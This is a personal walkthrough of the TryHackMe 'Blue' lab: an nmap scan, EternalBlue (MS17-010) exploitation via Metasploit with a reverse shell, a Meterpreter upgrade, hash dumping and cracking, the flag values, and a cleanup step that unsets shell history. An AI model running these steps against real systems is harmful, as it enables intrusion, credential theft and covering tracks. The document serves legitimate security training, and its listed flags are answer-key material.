# [Blue]

## Basic Info
- **Platform**: TryHackMe
- **IP Address**: 10.10.5.87
- **Date**: 05/03/2025
- **Difficulty**: Easy
- **Tags**: Enumeration, Exploitation, Privilege Escalation

---

## Scanning & Enumeration

### Nmap
**Command:**
```bash
nmap -sVC -T4 -p- --open <ip> -oN blue.nmap
```

**Result Summary:**

```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2025-05-02T14:26:05
|_Not valid after:  2025-11-01T14:26:05
|_ssl-date: 2025-05-03T15:50:43+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:50:17:50:99:b1 (unknown)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: -1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-03T10:50:37-05:00
| smb2-time: 
|   date: 2025-05-03T15:50:37
|_  start_date: 2025-05-03T14:26:04
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


```

---

## Service Analysis

### Port 445 - SMB
- **What’s running:** Microsoft SMB (Server Message Block)
- **Interesting files/directories:** 
- **Vulnerabilities identified:** ms17-010

---

## Exploitation

### Method Used:
- Vulnerability: ms17-010
- Exploit Used: exploit/windows/smb/ms17_010_eternalblue AKA eternalblue
- Shell Access Gained: Yes, reverse shell via Metasploit

**Commands:**
```bash
msfconsole - to start MetaSploit
	set the RHOST to <target_ip>
	set the LHOST to <your_ip>
	set payload windows/x64/shell/reverse_tcp #set the payload to get a reverse shell. 
	show targets  #to show potentional targets you can set which varies of the OS that the target has
	set target 1  #to select target os
	run #then run the exploit

```
---

```bash
CTRL+Z to background the shell
Then ran "search shell_to_meterpreter" #to have a stable meterpreter session
use 0 - to choose the exploit
sessions -l #to list the shells that we have.
set session 1
run #This upgrades the session
```
The session will look like it dropped, if you see 'stopping exploit/multi/handlder' it did not crash, instead run the following.

```bash

session 2 #this selects the upgraded session

```

We can see that our process ID belongs to powershell.exe and is running as NT AUTHORITY\SYSTEM.

then run:

```bash

hashdump

```

We can crack this hash using john with the following command after adding the hash (we just need the last part of the hash after the last “:”) to a file called “hash.txt” for the user Jon.

```bash

echo <hash> > hash.txt

```

Then now we have a password.

Now lets get the flags:

```bash
search -f *.txt - search for all the flags

```

```bash
cat "C:\\flag1.txt"
cat "c:\\Windows\\System32\\config\\flag2.txt"
cat "c:\\Users\\Jon\\Documents\\flag3.txt"
```

### User Enumeration
getuid
ps

### File Discovery
Flag 1 location: C:\flag1.txt <br>
Flag 2 location: c:\Windows\System32\config\flag2.txt <br>
Flag 3 location: c:\Users\Jon\Documents\flag3.txt

---

## Privilege Escalation

### Method Used:
Not applicable — already NT AUTHORITY\SYSTEM from exploit

---

## Flags

- **Flag 1** flag{access_the_machine}
- **Flag 2** flag{sam_database_elevated_access}
- **Flag 3** flag{admin_documents_can_be_valuable}

---

## Lessons Learned
- I've learned sometimes if you have a firewall setup on your machine that you will need to allow list the ports that your room is using to connect back to your machine.
- Within the upgraded shell, you sometimes need to use a double "\\" for the absolute filepath to "cat" out the file contents of files.
- 

---

## Cleanup (If applicable)
```bash
rm /tmp/<filename>
unset HISTFILE
```


## Summary/Understanding of what I've learned in this room
- Learned how to exploit the EternalBlue vulnerability (MS17-010) on a vulnerable Windows 7 machine using Metasploit.
- Even though the exploit grants SYSTEM immediately, upgrading to Meterpreter makes post-exploitation easier.
- Extracted NTLM hashes and used John the Ripper for cracking.
